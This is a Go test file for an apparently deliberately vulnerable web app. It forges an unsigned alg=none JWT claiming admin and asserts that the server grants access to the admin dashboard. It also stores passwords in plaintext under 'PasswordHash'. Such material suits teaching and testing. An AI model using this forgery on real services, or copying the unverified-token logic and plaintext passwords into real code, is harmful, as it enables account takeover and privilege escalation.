package main

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
)

// TestEndToEndAdminBypass exercises the full HTTP stack with memStore (no
// live Postgres needed): a normal, non-admin user logs in and is correctly
// denied the admin dashboard, then a forged alg=none token is used to
// bypass that check entirely.
func TestEndToEndAdminBypass(t *testing.T) {
	store := newMemStore(
		User{ID: 1, Username: "carol", PasswordHash: "carol-plaintext-pw", Role: "user"},
		User{ID: 2, Username: "root_admin", PasswordHash: "admin-plaintext-pw", Role: "admin"},
	)
	s := newServer(store)
	ts := httptest.NewServer(s.mux)
	defer ts.Close()

	// 1. Log in as the non-admin user and get a legitimately-signed token.
	loginBody, _ := json.Marshal(loginRequest{Username: "carol", Password: "carol-plaintext-pw"})
	resp, err := http.Post(ts.URL+"/login", "application/json", bytes.NewReader(loginBody))
	if err != nil {
		t.Fatalf("login request failed: %v", err)
	}
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("expected login to succeed, got status %d", resp.StatusCode)
	}
	var loginResp loginResponse
	if err := json.NewDecoder(resp.Body).Decode(&loginResp); err != nil {
		t.Fatalf("decode login response: %v", err)
	}
	resp.Body.Close()
	if loginResp.Token == "" {
		t.Fatalf("expected non-empty token from login")
	}

	// 2. Confirm the legit non-admin token is correctly denied the
	// admin dashboard.
	req, _ := http.NewRequest(http.MethodGet, ts.URL+"/api/admin/dashboard", nil)
	req.Header.Set("Authorization", "Bearer "+loginResp.Token)
	resp, err = http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("admin dashboard request failed: %v", err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusForbidden {
		t.Fatalf("expected non-admin user to be forbidden (403), got %d", resp.StatusCode)
	}

	// 3. Forge an alg=none token claiming role=admin, with no valid
	// login at all, and confirm it grants access anyway.
	headerSeg := b64urlEncode(mustJSON(t, map[string]string{"alg": "none", "typ": "JWT"}))
	payloadSeg := b64urlEncode(mustJSON(t, Claims{Sub: "attacker", Role: "admin", Exp: 9999999999}))
	forged := headerSeg + "." + payloadSeg + "."

	req, _ = http.NewRequest(http.MethodGet, ts.URL+"/api/admin/dashboard", nil)
	req.Header.Set("Authorization", "Bearer "+forged)
	resp, err = http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("forged admin dashboard request failed: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("expected forged alg=none admin token to be accepted (200), got %d", resp.StatusCode)
	}

	var dash map[string]any
	if err := json.NewDecoder(resp.Body).Decode(&dash); err != nil {
		t.Fatalf("decode dashboard response: %v", err)
	}
	if dash["sub"] != "attacker" {
		t.Fatalf("expected dashboard response to reflect forged sub=attacker, got %+v", dash)
	}
}
